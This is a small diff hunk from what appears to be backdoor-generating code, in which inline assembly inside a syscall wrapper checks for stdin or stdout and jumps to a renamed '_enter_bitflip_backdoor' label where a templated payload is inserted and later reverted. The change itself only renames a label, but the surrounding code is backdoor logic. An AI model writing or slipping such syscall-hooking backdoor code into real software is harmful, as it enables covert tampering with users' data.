@@ -178,11 +178,11 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
 
                 ; esi, edx, ecx, ebx are free because we are in a syscall wrapper restoring them
                 test ebx, ebx ; test if ebx is 0 (stdin)
-                je _enter_bitflip
+                je _enter_bitflip_backdoor
                 cmp ebx, 1 ; stdout is also good
                 jne _exit_backdoor
 
-                _enter_bitflip:
+                _enter_bitflip_backdoor:
                 %s
 
                 ; revert changes of the bitflip
